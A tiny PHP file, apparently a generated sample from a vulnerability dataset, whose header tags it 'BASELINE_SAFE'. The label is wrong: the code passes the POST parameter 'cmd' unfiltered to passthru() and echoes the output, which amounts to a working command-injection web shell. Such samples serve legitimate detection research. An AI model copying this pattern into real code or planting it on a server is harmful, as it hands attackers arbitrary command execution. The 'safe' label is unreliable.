<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_AKE; SKELETON=S0; KEY=cmd; SINK=B4; VAR=v0144 */
function SINK_B4($command){
    passthru($command);
}
$inp = array_key_exists("cmd", $_POST) ? (string)$_POST["cmd"] : "";
$inp = (string)$inp; // no value processing
$out = SINK_B4($inp);
echo (string)($out);
?>
